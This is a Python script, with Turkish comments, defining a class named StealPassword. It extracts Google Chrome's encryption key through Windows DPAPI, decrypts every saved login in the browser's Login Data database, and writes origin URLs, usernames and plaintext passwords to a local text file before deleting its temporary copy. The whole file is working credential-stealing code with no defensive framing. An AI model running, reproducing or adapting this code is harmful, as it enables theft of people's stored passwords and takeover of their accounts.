import os, json, base64, sqlite3, win32crypt, shutil
from Crypto.Cipher import AES
from datetime import datetime, timedelta

class StealPassword:
    @staticmethod
    def get_chrome_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    @staticmethod
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    @staticmethod
    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""

    @staticmethod
    def main():
        # AES keyi al
        key = StealPassword().get_encryption_key()
        # Yerel SQLite Chrome veritabanı yolunu al
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

        with open("passwords.txt", "w") as passwords_file:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = StealPassword().decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    passwords_file.write(f"Origin URL: {origin_url}\n")
                    passwords_file.write(f"Action URL: {action_url}\n")
                    passwords_file.write(f"Username: {username}\n")
                    passwords_file.write(f"Password: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    passwords_file.write(f"Creation date: {str(StealPassword().get_chrome_datetime(date_created))}\n")
                if date_last_used != 86400000000 and date_last_used:
                    passwords_file.write(f"Last Used: {str(StealPassword().get_chrome_datetime(date_last_used))}\n")
                passwords_file.write("=" * 50 + "\n")

        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass